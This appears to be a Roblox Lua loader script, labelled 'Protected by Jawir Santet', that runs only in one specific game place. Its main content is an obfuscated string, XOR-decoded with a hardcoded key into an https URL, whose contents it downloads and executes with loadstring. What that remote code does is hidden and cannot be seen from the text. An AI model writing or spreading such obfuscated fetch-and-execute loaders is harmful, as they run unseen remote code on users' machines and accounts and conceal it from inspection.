if tostring(game.PlaceId) ~= "7871169780" then
    return
end

--[[ Protected by Jawir Santet ]]

( function (...) local _IllIIIllII = "\002\021\003\025\001\085\065\091\029\017\029\079\016\000\006\007\027\022\026\003\015\019\020\006\028\027\011\026\027\094\009\014\026\070\060\014\026\000\014\028\016\078\005\011\030\023\065\006\010\022\025\078\031\012\019\011\029\091\002\017\003\015\088\011\030\000\013\031\010\002\007\000\025\054\023\028\030\090\003\005\011" local _IIIlIIlIIl = "jawirontop" local function _lllIlIllll(str, k) local _llIlllIlll = {} for i = 0x1, #str do local _IIIIllIIII = string.byte(str, i) local _lIIlIllIlI = string.byte(k, ((i - 0x1) % #k) + 0x1) table.insert(_llIlllIlll, string.char(bit32.bxor(_IIIIllIIII, _lIIlIllIlI))) end
 return table.concat(_llIlllIlll) end
 local _llIIllIIII = _lllIlIllll(_IllIIIllII, _IIIlIIlIIl) if not _llIIllIIII:match("^https://") then return end
 local _IlIIIIllIl = game:HttpGet(_llIIllIIII) loadstring(_IlIIIIllIl)() end
 )(...)
